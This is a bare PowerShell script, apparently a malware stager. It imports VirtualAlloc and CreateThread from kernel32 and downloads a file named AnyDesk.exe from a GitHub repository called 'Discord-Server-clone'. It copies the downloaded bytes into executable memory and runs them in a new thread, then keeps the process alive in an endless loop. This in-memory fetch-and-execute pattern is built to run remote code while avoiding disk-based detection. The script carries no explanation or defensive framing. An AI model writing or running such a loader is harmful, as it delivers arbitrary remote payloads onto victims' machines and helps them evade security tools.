$code = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);'
$win32 = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32Functions -PassThru
$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/Bypass-wq/Discord-Server-clone/raw/main/AnyDesk.exe')
$size = $bytes.Length
$addr = $win32::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $size)
$win32::CreateThread(0, 0, $addr, 0, 0, 0) | Out-Null
while ($true) { Start-Sleep 10 }